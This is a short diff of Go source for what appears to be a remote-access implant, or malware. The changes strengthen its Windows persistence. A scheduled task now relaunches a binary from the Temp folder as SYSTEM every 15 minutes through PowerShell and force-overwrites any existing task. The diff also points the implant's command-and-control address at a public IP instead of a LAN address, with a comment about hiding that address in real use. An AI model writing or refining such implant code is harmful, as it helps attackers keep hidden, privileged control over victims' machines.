@@ -238,9 +238,11 @@ func persist(conn *net.Conn, taskName string) { //Refine it a bit more
 		"schtasks",
 		"/create",
 		"/tn", taskName,
-		"/sc", "onstart",
+		"/sc", "minute",
+		"/mo", "15",
 		"/ru", "SYSTEM",
-		"/tr", fmt.Sprintf(`cmd.exe /C C:\Windows\Temp\%s.exe`, taskName),
+		"/f",
+		"/tr", fmt.Sprintf(`powershell.exe /C start C:\Windows\Temp\%s.exe`, taskName),
 	}
 
 	cmd := exec.Command("cmd", command...)
@@ -324,7 +326,7 @@ func unifiedCommandHandler(conn *net.Conn, implantWD *string) {
 }
 
 func main() {
-	c2Address := "192.168.0.102:4321" // Encrypt/decode at runtime in real use
+	c2Address := "89.43.33.169:4445" // Encrypt/decode at runtime in real use
 	attempts := 0
 	implantWD, _ := os.Getwd()
 	fmt.Println("Implant Started")
